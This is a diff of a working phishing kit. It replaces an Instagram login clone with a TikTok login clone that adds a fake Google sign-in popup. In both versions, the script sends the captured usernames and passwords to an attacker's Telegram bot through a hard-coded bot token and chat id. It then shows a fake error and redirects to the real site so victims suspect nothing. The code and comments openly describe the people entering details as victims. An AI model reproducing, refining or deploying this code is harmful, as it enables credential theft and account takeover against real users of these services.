@@ -1,65 +1,207 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram | Entrar</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in to TikTok</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; border-radius: 3px; width: 350px; padding: 40px 40px 20px; text-align: center; }
-        .logo { font-family: 'Billabong', cursive; font-size: 3em; margin-bottom: 20px; color: #262626; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 8px; font-weight: bold; cursor: pointer; margin: 10px 0; font-size: 14px; }
-        button:hover { background: #1877f2; }
-        .footer { margin-top: 30px; font-size: 12px; color: #8e8e8e; }
-        .error { color: red; font-size: 12px; margin-top: 5px; display: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #f5f5f5; 
+            color: #000; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        .container { 
+            background: white; 
+            border-radius: 12px; 
+            width: 100%; 
+            max-width: 420px; 
+            padding: 40px 24px; 
+            text-align: center; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
+        }
+        h1 { 
+            font-size: 28px; 
+            font-weight: 700; 
+            margin-bottom: 12px; 
+        }
+        p.subtitle { 
+            font-size: 15px; 
+            color: #666; 
+            margin-bottom: 40px; 
+            line-height: 1.4; 
+        }
+        .btn { 
+            width: 100%; 
+            padding: 16px; 
+            margin: 12px 0; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            background: white; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 12px; 
+            transition: background 0.2s; 
+        }
+        .btn:hover { background: #f8f8f8; }
+        .btn img { width: 24px; height: 24px; }
+        .login-form, .google-form { display: none; }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            margin: 12px 0; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            background: #fafafa; 
+        }
+        .submit-btn { 
+            background: #000; 
+            color: white; 
+            border: none; 
+        }
+        .submit-btn:hover { background: #111; }
+        .error { 
+            color: #e50914; 
+            font-size: 14px; 
+            margin-top: 8px; 
+            display: none; 
+        }
+        .footer { 
+            margin-top: 40px; 
+            font-size: 12px; 
+            color: #888; 
+            line-height: 1.5; 
+        }
+        .popup { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.6); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 999; 
+            display: none; 
+        }
+        .popup-content { 
+            background: white; 
+            padding: 32px 24px; 
+            border-radius: 12px; 
+            width: 90%; 
+            max-width: 380px; 
+            text-align: center; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3); 
+        }
+        @media (max-width: 360px) {
+            .container { padding: 30px 16px; }
+            h1 { font-size: 26px; }
+            .btn { padding: 14px; font-size: 15px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">Instagram</div>
-        <form id="phishForm">
-            <input type="text" id="username" placeholder="Telefone, usuário ou email" required>
-            <input type="password" id="password" placeholder="Senha" required>
-            <button type="submit">Entrar</button>
-            <div id="errorMsg" class="error">Senha incorreta, tente novamente.</div>
-        </form>
-        <div class="footer">© 2026 Instagram from Meta</div>
+        <h1>Log in to TikTok</h1>
+        <p class="subtitle">Manage your account, check notifications,<br>comment on videos, and more.</p>
+
+        <!-- Tela inicial só com Google e phone/email/username -->
+        <div id="options">
+            <button class="btn" onclick="showGooglePopup()">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="G"> 
+                Continue with Google
+            </button>
+            <button class="btn" onclick="showTikTokForm()">
+                <span style="font-size:24px;">👤</span> 
+                Use phone / email / username
+            </button>
+        </div>
+
+        <!-- Form TikTok manual -->
+        <div id="tiktokForm" class="login-form">
+            <input type="text" id="tiktokUser" placeholder="Phone / email / username" required>
+            <input type="password" id="tiktokPass" placeholder="Password" required>
+            <button class="btn submit-btn" onclick="captureTikTok()">Log in</button>
+            <div id="tiktokError" class="error">Incorrect password. Please try again.</div>
+        </div>
+    </div>
+
+    <!-- Popup fake Google -->
+    <div id="googlePopup" class="popup">
+        <div class="popup-content">
+            <h2>Sign in with Google</h2>
+            <p>Use your Google Account</p>
+            <input type="email" id="gmail" placeholder="Email or phone" required>
+            <input type="password" id="googlePass" placeholder="Password" required>
+            <button class="btn submit-btn" onclick="captureGoogle()">Next</button>
+            <div id="googleError" class="error">Wrong password. Try again or use another account.</div>
+            <p style="font-size:12px; color:#666; margin-top:20px;">Not your computer? Use Guest mode to sign in privately.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        By continuing, you agree to our Terms of Service and<br>acknowledge that you have read our Privacy Policy to learn<br>how we collect, use, and share your data.
     </div>
 
     <script>
-        document.getElementById('phishForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            var user = document.getElementById('username').value.trim();
-            var pass = document.getElementById('password').value.trim();
-            
-            if (!user || !pass) return;
-            
-            var message = "💀 VÍTIMA CAIU NA PORRA DO INSTA 💀\n\n" +
-                          "👤 Usuário/Email: " + user + "\n" +
-                          "🔑 Senha: " + pass + "\n" +
-                          "⏰ Hora: " + new Date().toLocaleString('pt-BR') + "\n" +
-                          "🌐 IP/Info: (abre no browser pra ver mais)";
-            
-            // Teus dados reais colados aqui ↓↓↓ NÃO MEXE SE NÃO FUDE
+        function showGooglePopup() {
+            document.getElementById('googlePopup').style.display = 'flex';
+        }
+
+        function showTikTokForm() {
+            document.getElementById('options').style.display = 'none';
+            document.getElementById('tiktokForm').style.display = 'block';
+        }
+
+        function captureGoogle() {
+            var gmail = document.getElementById('gmail').value.trim();
+            var gpass = document.getElementById('googlePass').value.trim();
+            if (!gmail || !gpass) return;
+
+            var message = "🔥 GOOGLE CAIU NO TIKTOK DOUBLE DIP 🔥\nGmail: " + gmail + "\nSenha Google: " + gpass + "\nHora: " + new Date().toLocaleString('pt-BR');
+
             var token = "8577826419:AAGGixKMnyFOGC46Iit5yPcJDIrh90rLvyI";
             var chat_id = "-1003426300480";
-            
+
             fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(message))
-                .then(response => {
-                    // Mostra erro fake pra parecer real
-                    document.getElementById('errorMsg').style.display = 'block';
-                    // Espera 3s "verificando" e redireciona pro real
+                .then(() => {
+                    document.getElementById('googleError').style.display = 'block';
                     setTimeout(() => {
-                        window.location.href = "https://www.instagram.com/accounts/login/";
+                        document.getElementById('googlePopup').style.display = 'none';
+                        window.location.href = "https://www.tiktok.com/";
                     }, 3000);
                 })
-                .catch(error => {
-                    // Se der pau no fetch (raro), redireciona mesmo assim
-                    window.location.href = "https://www.instagram.com/accounts/login/";
-                });
-        });
+                .catch(() => { window.location.href = "https://www.tiktok.com/"; });
+        }
+
+        function captureTikTok() {
+            var user = document.getElementById('tiktokUser').value.trim();
+            var pass = document.getElementById('tiktokPass').value.trim();
+            if (!user || !pass) return;
+
+            var message = "🔥 TIKTOK SENHA MANUAL CAIU 🔥\nUser/Email/Phone: " + user + "\nSenha TikTok: " + pass + "\nHora: " + new Date().toLocaleString('pt-BR');
+
+            var token = "8577826419:AAGGixKMnyFOGC46Iit5yPcJDIrh90rLvyI";
+            var chat_id = "-1003426300480";
+
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(message))
+                .then(() => {
+                    document.getElementById('tiktokError').style.display = 'block';
+                    setTimeout(() => { window.location.href = "https://www.tiktok.com/"; }, 4000);
+                })
+                .catch(() => { window.location.href = "https://www.tiktok.com/"; });
+        }
     </script>
 </body>
 </html>
